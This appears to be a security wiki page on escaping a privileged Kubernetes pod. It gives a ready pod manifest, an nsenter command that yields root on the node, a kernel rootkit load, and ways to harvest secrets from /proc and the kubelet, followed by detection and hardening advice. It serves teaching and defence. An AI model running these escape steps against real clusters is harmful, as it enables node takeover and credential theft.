---
title: Privileged pod
slug: k8s-privileged-pod
---

> **TL;DR:** A pod with `privileged: true` (or `CAP_SYS_ADMIN`/`CAP_SYS_MODULE`) combined with `hostPID` or `hostNetwork` shares the node's kernel and namespaces — load a kernel module, `nsenter` into pid 1, or sniff host traffic, and the container boundary is decorative.

## What it is
Kubernetes `securityContext.privileged: true` disables most of the namespace and capability restrictions Docker/containerd normally apply. The container shares the host kernel with full capabilities (`CAP_SYS_ADMIN`, `CAP_SYS_MODULE`, `CAP_SYS_PTRACE`, etc.), `/dev` access, AppArmor/SELinux off. Add `hostPID: true` and you see every host process — `nsenter -t 1 -m -u -i -n -p -- /bin/sh` drops you to root on the node. Add `hostNetwork: true` and you bind on the node's interfaces and bypass NetworkPolicy entirely.

## Preconditions / where it applies
- `pods/create` (directly or via controller) in some namespace, with Pod Security Standards `privileged` profile allowed (or no admission policy, or webhook bypassed — see [[k8s-admission-controllers]]).
- For module load: nodes with `CONFIG_MODULES=y` (default on most distros) and writable `/lib/modules` mount.

## Technique
**Bare minimum manifest:**

```yaml
apiVersion: v1
kind: Pod
metadata: {name: pr, namespace: default}
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: x
    image: alpine
    command: ["sh","-c","sleep infinity"]
    securityContext: {privileged: true}
```

**Escape — easy:**

```sh
# host pid 1 is the init system; nsenter into all its namespaces
nsenter -t 1 -m -u -i -n -p -- /bin/sh
# now you're effectively root on the node
```

**Escape — kernel module load:** with `CAP_SYS_MODULE`, even without privileged true:

```sh
insmod /tmp/rootkit.ko    # arbitrary code in kernel space
```

A trivial rootkit gives persistence that survives pod deletion.

**hostNetwork tricks:**
- Bind to a node port and impersonate a kubelet/etcd endpoint.
- Sniff cluster traffic, including service-mesh mTLS bootstrap.
- Reach metadata service (`169.254.169.254`) without per-pod allow-list.

**hostPID tricks beyond nsenter:**
- Read `/proc/1/environ` and other PIDs' env vars (often contain secrets).
- `cat /proc/<kube-apiserver-pid>/cmdline` to recover etcd creds passed on CLI.
- Inject into kubelet / containerd via `gdb -p`.

**Capability-only variants worth knowing:**
- `CAP_SYS_PTRACE` + hostPID → ptrace any host process.
- `CAP_DAC_READ_SEARCH` → read any file regardless of permissions.
- `CAP_NET_RAW` + hostNetwork → raw sockets, ARP/MITM on the node LAN.

Chain with [[k8s-host-mount-escape]] (often combined: privileged + hostPath /) and [[k8s-rbac-abuse]] for the `pods/create` permission acquisition.

## Detection and defence
- Enforce Pod Security Standards `restricted` profile cluster-wide; allow `privileged` only in tightly-scoped namespaces.
- Kyverno/Gatekeeper rules to deny `privileged`, `hostPID`, `hostNetwork`, `hostIPC`, dangerous capabilities, and `/dev` mounts.
- Use seccomp `runtime/default` and AppArmor profiles per-workload.
- Run a kernel-module integrity tool; alert on unexpected `insmod`.
- Falco: `Launch Privileged Container`, `Mount sensitive directory`, `Module load`.
- Detect via audit log: `pods/create` with `securityContext.privileged=true`.

## References
- [Kubernetes — Security context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) — privileged semantics
- [HackTricks — k8s pentest](https://book.hacktricks.wiki/en/pentesting-network/pentesting-kubernetes/index.html) — escape catalog
- [Falco rules](https://github.com/falcosecurity/rules) — runtime detection

See also: [[k8s-rbac-abuse]], [[k8s-service-account-tokens]], [[k8s-host-mount-escape]], [[kubelet-exposed-api-attacks]], [[k8s-image-registry-poisoning]], [[linux-capabilities-abuse]]
